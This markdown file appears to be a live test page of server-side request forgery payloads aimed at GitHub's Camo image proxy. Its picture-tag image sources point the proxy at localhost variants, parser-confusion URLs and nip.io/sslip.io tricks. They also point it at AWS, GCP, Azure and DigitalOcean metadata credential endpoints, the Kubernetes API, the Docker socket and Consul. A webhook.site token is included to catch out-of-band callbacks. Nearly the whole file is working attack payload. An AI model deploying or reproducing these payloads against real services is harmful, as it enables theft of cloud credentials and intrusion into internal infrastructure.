# 🔬 SSRF Validation Tests v2

Advanced bypass techniques for GitHub Camo proxy.

## Round 2: Advanced Bypass Techniques

### IPv4-mapped IPv6
<picture>
  <source srcset="http://[::ffff:127.0.0.1]/ssrf-ipv4mapped">
  <img src="https://via.placeholder.com/1x1.png" alt="IPv4 Mapped">
</picture>

### IPv6 Compressed Localhost
<picture>
  <source srcset="http://[0:0:0:0:0:0:0:1]/ssrf-ipv6-compressed">
  <img src="https://via.placeholder.com/1x1.png" alt="IPv6 Compressed">
</picture>

### Domain with localhost CNAME
<picture>
  <source srcset="http://localtest.me/ssrf-localtest">
  <img src="https://via.placeholder.com/1x1.png" alt="Localtest">
</picture>

### Spoofed Host with @
<picture>
  <source srcset="http://example.com@127.0.0.1/ssrf-at-sign">
  <img src="https://via.placeholder.com/1x1.png" alt="At Sign">
</picture>

### URL with Credentials
<picture>
  <source srcset="http://foo:bar@127.0.0.1/ssrf-creds">
  <img src="https://via.placeholder.com/1x1.png" alt="Creds">
</picture>

### Double URL Encoding
<picture>
  <source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/ssrf-double%252Fencoded">
  <img src="https://via.placeholder.com/1x1.png" alt="Double Encoded">
</picture>

### Unicode Normalization
<picture>
  <source srcset="http://127。1/ssrf-unicode">
  <img src="https://via.placeholder.com/1x1.png" alt="Unicode">
</picture>

### Rare TLD (nip.io resolves to embedded IP)
<picture>
  <source srcset="http://127.0.0.1.nip.io/ssrf-nip">
  <img src="https://via.placeholder.com/1x1.png" alt="nip.io">
</picture>

### sslip.io variant
<picture>
  <source srcset="http://127-0-0-1.sslip.io/ssrf-sslip">
  <img src="https://via.placeholder.com/1x1.png" alt="sslip.io">
</picture>

### AWS IMDSv1 via IP
<picture>
  <source srcset="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
  <img src="https://via.placeholder.com/1x1.png" alt="AWS IMDS">
</picture>

### GCP Metadata
<picture>
  <source srcset="http://metadata.google.internal/computeMetadata/v1/">
  <img src="https://via.placeholder.com/1x1.png" alt="GCP">
</picture>

### Azure Metadata
<picture>
  <source srcset="http://169.254.169.254/metadata/instance?api-version=2021-02-01">
  <img src="https://via.placeholder.com/1x1.png" alt="Azure">
</picture>

### DigitalOcean Metadata
<picture>
  <source srcset="http://169.254.169.254/metadata/v1/">
  <img src="https://via.placeholder.com/1x1.png" alt="DO">
</picture>

### Kubernetes API
<picture>
  <source srcset="https://kubernetes.default.svc/api/v1/namespaces">
  <img src="https://via.placeholder.com/1x1.png" alt="K8s">
</picture>

### Docker Socket via HTTP
<picture>
  <source srcset="http://127.0.0.1:2375/version">
  <img src="https://via.placeholder.com/1x1.png" alt="Docker">
</picture>

### Consul
<picture>
  <source srcset="http://127.0.0.1:8500/v1/agent/self">
  <img src="https://via.placeholder.com/1x1.png" alt="Consul">
</picture>

### Zero Prefix IP
<picture>
  <source srcset="http://0.0.0.0/ssrf-zero">
  <img src="https://via.placeholder.com/1x1.png" alt="Zero IP">
</picture>

### Localhost Alias (some systems)
<picture>
  <source srcset="http://localhost/ssrf-localhost">
  <img src="https://via.placeholder.com/1x1.png" alt="Localhost">
</picture>

### Short IP (some parsers expand)
<picture>
  <source srcset="http://127.1/ssrf-short">
  <img src="https://via.placeholder.com/1x1.png" alt="Short IP">
</picture>

### Internal hostname guessing
<picture>
  <source srcset="http://github-internal/ssrf-internal">
  <img src="https://via.placeholder.com/1x1.png" alt="Internal Host">
</picture>

<picture>
  <source srcset="http://camo-internal/ssrf-camo">
  <img src="https://via.placeholder.com/1x1.png" alt="Camo Internal">
</picture>

### Webhook with custom path params
<picture>
  <source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/round2/test1">
  <img src="https://via.placeholder.com/1x1.png" alt="Webhook R2">
</picture>

### Parser Confusion - Multiple @
<picture>
  <source srcset="http://foo@evil.com@127.0.0.1/ssrf-multi-at">
  <img src="https://via.placeholder.com/1x1.png" alt="Multi At">
</picture>

### Fragment abuse
<picture>
  <source srcset="http://127.0.0.1#@webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/fragment">
  <img src="https://via.placeholder.com/1x1.png" alt="Fragment">
</picture>

### Tab/newline in URL
<picture>
  <source srcset="http://127.0.0.1%09/ssrf-tab">
  <img src="https://via.placeholder.com/1x1.png" alt="Tab">
</picture>

---
**Webhook Token:** `b45a05ce-3f7d-4a49-9e5d-5a138dde5eca`
